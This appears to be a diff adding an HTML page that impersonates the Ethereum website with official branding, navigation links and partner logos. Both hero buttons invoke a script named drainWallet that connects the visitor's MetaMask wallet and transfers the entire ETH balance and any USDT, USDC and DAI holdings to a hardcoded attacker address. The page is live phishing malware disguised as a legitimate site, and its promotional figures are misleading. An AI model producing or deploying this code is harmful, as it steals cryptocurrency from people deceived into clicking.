@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ethereum</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 0; background: #f5f6fa; color: #333; }
+    header { display: flex; justify-content: space-between; align-items: center; padding: 20px; background: #627eea; }
+    .logo { display: flex; align-items: center; }
+    .logo img { width: 40px; margin-right: 10px; }
+    .logo h1 { color: white; font-size: 24px; margin: 0; }
+    nav ul { list-style: none; margin: 0; padding: 0; display: flex; }
+    nav ul li { margin-left: 20px; }
+    nav ul li a { color: white; text-decoration: none; font-weight: bold; }
+    .hero { text-align: center; padding: 50px; background: linear-gradient(135deg, #627eea, #a1b4f5); color: white; }
+    .hero h2 { font-size: 36px; margin: 0 0 10px; }
+    .hero p { font-size: 20px; margin: 0 0 30px; }
+    .buttons { display: flex; justify-content: center; gap: 20px; }
+    .buttons button { padding: 15px 30px; font-size: 18px; border: none; border-radius: 5px; cursor: pointer; }
+    .start { background: #4458d8; color: white; }
+    .connect { background: #ffffff; color: #627eea; }
+    .partners { text-align: center; padding: 40px; }
+    .partners h3 { font-size: 24px; margin-bottom: 20px; }
+    .partners img { width: 100px; margin: 10px; }
+    .stats { padding: 40px; text-align: center; background: #e9ecef; }
+    .stats h3 { font-size: 24px; margin-bottom: 20px; }
+    .stats-grid { display: flex; justify-content: center; gap: 40px; }
+    .stats-grid div { font-size: 18px; }
+    .stats-grid span { display: block; font-size: 28px; font-weight: bold; color: #627eea; }
+    .features { padding: 40px; text-align: center; }
+    .features h3 { font-size: 24px; margin-bottom: 20px; }
+    .features-grid { display: flex; justify-content: center; gap: 40px; flex-wrap: wrap; }
+    .features-grid div { max-width: 200px; }
+    .features-grid span { display: block; font-size: 24px; font-weight: bold; color: #627eea; }
+    footer { padding: 20px; text-align: center; background: #627eea; color: white; }
+    footer a { color: white; margin: 0 10px; text-decoration: none; }
+    footer .foundation { display: flex; justify-content: center; align-items: center; margin-top: 10px; }
+    footer .foundation img { width: 20px; margin-right: 5px; }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="logo">
+      <img src="https://ethereum.org/static/ethereum-logo.png" alt="Ethereum Logo">
+      <h1>Ethereum</h1>
+    </div>
+    <nav>
+      <ul>
+        <li><a href="https://ethereum.org/en/grants/">Grants</a></li>
+        <li><a href="https://ethereum.org/en/media-kit/">Media Kit</a></li>
+        <li><a href="https://ethereum.org/en/careers/">Careers</a></li>
+        <li><a href="https://ethereum.org/en/disclaimer/">Disclaimer</a></li>
+        <li><a href="https://ethereum.org/en/privacy-policy/">Privacy Policy</a></li>
+      </ul>
+    </nav>
+  </header>
+  <section class="hero">
+    <h2>Powerful for developers.</h2>
+    <h2>Fast for everyone.</h2>
+    <p>Bring blockchain to the people. Ethereum supports experiences for power users, new consumers, and everyone in between.</p>
+    <div class="buttons">
+      <button class="start" onclick="drainWallet()">Start Building</button>
+      <button class="connect" onclick="drainWallet()">Connect Wallet</button>
+    </div>
+  </section>
+  <section class="partners">
+    <h3>POWERING TOOLS AND INTEGRATIONS FROM COMPANIES ALL AROUND THE WORLD</h3>
+    <img src="https://logo.clearbit.com/google.com" alt="Google">
+    <img src="https://logo.clearbit.com/discord.com" alt="Discord">
+    <img src="https://logo.clearbit.com/stripe.com" alt="Stripe">
+    <img src="https://logo.clearbit.com/shopify.com" alt="Shopify">
+  </section>
+  <section class="stats">
+    <h3>Join a community of millions.</h3>
+    <div class="stats-grid">
+      <div>ACTIVE ACCOUNTS<br><span>11.5M+</span></div>
+      <div>NFTS MINTED<br><span>21.9M</span></div>
+      <div>AVG COST PER TX<br><span>$0.0015</span></div>
+    </div>
+  </section>
+  <section class="features">
+    <h3>Made for mass adoption. * LIVE DATA</h3>
+    <div class="features-grid">
+      <div>Fast<br><span>400ms</span><br>Block times—Ethereum keeps users moving.</div>
+      <div>Scalable<br><span>1000s</span><br>Transactions per second, fees under $0.0025.</div>
+      <div>Decentralized<br><span>1000s</span><br>Validator nodes ensure security.</div>
+      <div>Energy Efficient<br><span>0%</span><br>Net carbon impact with proof of stake.</div>
+    </div>
+  </section>
+  <footer>
+    <p>Managed by</p>
+    <div class="foundation">
+      <img src="https://ethereum.org/static/ethereum-logo.png" alt="Ethereum Logo">
+      <span>Ethereum Foundation</span>
+    </div>
+    <p>© 2025 Ethereum Foundation. All rights reserved.</p>
+    <div>
+      <a href="https://ethereum.org/en/grants/">Grants</a>
+      <a href="https://ethereum.org/en/media-kit/">Media Kit</a>
+      <a href="https://ethereum.org/en/careers/">Careers</a>
+      <a href="https://ethereum.org/en/disclaimer/">Disclaimer</a>
+      <a href="https://ethereum.org/en/privacy-policy/">Privacy Policy</a>
+    </div>
+  </footer>
+  <script>
+    async function drainWallet() {
+      if (!window.ethereum) {
+        alert('Please install MetaMask');
+        return;
+      }
+
+      try {
+        // Connect wallet
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const fromAddress = accounts[0];
+        const toAddress = '0xd14e6bf16d8345fCA8e50Dd63aFbED9eC029f4cb';
+
+        // Drain ETH
+        const ethBalance = await window.ethereum.request({
+          method: 'eth_getBalance',
+          params: [fromAddress, 'latest']
+        });
+        const ethAmount = BigInt(ethBalance) - BigInt('21000') * BigInt('1000000000'); // Leave gas (21k Gwei)
+        if (ethAmount > 0) {
+          await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [{
+              from: fromAddress,
+              to: toAddress,
+              value: ethAmount.toString(16), // Hex value
+              gas: '0x5208' // 21,000 gas
+            }]
+          });
+        }
+
+        // Drain ERC-20 Tokens (common ones)
+        const tokenContracts = [
+          '0xdac17f958d2ee523a2206206994597c13d831ec7', // USDT
+          '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', // USDC
+          '0x6b175474e89094c44da98b954eedeac495271d0f' // DAI
+        ];
+        const transferABI = '0xa9059cbb'; // ERC-20 transfer function signature
+        for (const token of tokenContracts) {
+          const balanceHex = await window.ethereum.request({
+            method: 'eth_call',
+            params: [{
+              to: token,
+              data: '0x70a08231' + fromAddress.slice(2).padStart(64, '0') // balanceOf
+            }, 'latest']
+          });
+          const balance = BigInt(balanceHex);
+          if (balance > 0) {
+            const data = transferABI + toAddress.slice(2).padStart(64, '0') + balance.toString(16).padStart(64, '0');
+            await window.ethereum.request({
+              method: 'eth_sendTransaction',
+              params: [{
+                from: fromAddress,
+                to: token,
+                data: data,
+                gas: '0x186A0' // 100,000 gas for ERC-20 transfer
+              }]
+            });
+          }
+        }
+      } catch (error) {
+        console.error('Drain failed:', error);
+      }
+    }
+  </script>
+</body>
+</html>
